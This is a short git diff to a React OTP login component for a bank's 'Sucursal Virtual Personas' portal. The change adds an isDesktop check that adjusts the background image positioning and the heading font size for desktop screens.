@@ -5,7 +5,7 @@ import AccionesModal from "./modals/accionesModal";
 import NumOTPModal from "./modals/NumOTP-Modal";
 import Loading from "../../components/Loading";
 import './css/LoginModal.css';
-import { limpiarPaddingBody } from "@utils";
+import { isDesktop, limpiarPaddingBody } from "@utils";
 
 export default function NumeroOTP() {
 
@@ -558,6 +558,9 @@ export default function NumeroOTP() {
         setOtpFocused(true);
     };
 
+    // Se crea el return del componente
+    const desktop = isDesktop();
+
     // Renderizado del componente
     return (
         <div style={{ minHeight: "100dvh", display: "flex", flexDirection: "column" }}>
@@ -566,10 +569,10 @@ export default function NumeroOTP() {
                     flex: 1,
                     backgroundColor: "#2C2A29",
                     backgroundImage: 'url("/assets/images/auth-trazo.svg")',
-                    backgroundRepeat: "no-repeat",
+                    backgroundRepeat: desktop ? 'round' : 'no-repeat',
                     backgroundPosition: "center",
-                    backgroundPositionY: "-70px",
-                    backgroundPositionX: "-500px",
+                    backgroundPositionY: desktop ? "0px" : "-70px",
+                    backgroundPositionX: desktop ? "0px" : "-500px",
                 }}
             >
                 <div style={{ textAlign: "center" }}>
@@ -585,7 +588,7 @@ export default function NumeroOTP() {
                         marginTop: "25px",
                     }}
                 >
-                    <h1 className="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs">
+                    <h1 className="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs" style={{ fontSize: desktop ? 36 : 28.32 }}>
                         Sucursal Virtual Personas
                     </h1>
                 </div>
